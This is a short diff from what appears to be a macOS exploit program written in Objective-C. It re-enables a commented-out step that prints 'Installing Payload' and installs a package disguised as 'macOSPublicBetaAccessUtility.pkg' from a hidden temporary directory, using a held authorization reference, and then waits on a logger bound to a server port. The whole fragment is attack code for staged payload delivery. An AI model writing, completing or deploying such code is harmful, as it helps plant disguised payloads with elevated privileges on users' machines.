@@ -101,13 +101,13 @@ int main(int argc, const char *argv[]) {
     puts("[~] Preparing Stage2...");    
     loggerInit(&server_port);
 
-//    puts("[~] Installing Payload...");
-//    [Installer installPKG: @"file:///tmp/.tmp/macOSPublicBetaAccessUtility.pkg#macOSPublicBetaAccessUtility.pkg"
-//               withAuthorization:&authorizationRef
-//               toDest: @"/Volumes/.tmp"];
-//
-//    loggerAwait(&server_port);
-//
+    puts("[~] Installing Payload...");
+    [Installer installPKG: @"file:///tmp/.tmp/macOSPublicBetaAccessUtility.pkg#macOSPublicBetaAccessUtility.pkg"
+               withAuthorization:&authorizationRef
+               toDest: @"/Volumes/.tmp"];
+
+    loggerAwait(&server_port);
+
     while (1){}
     return 0;
 }
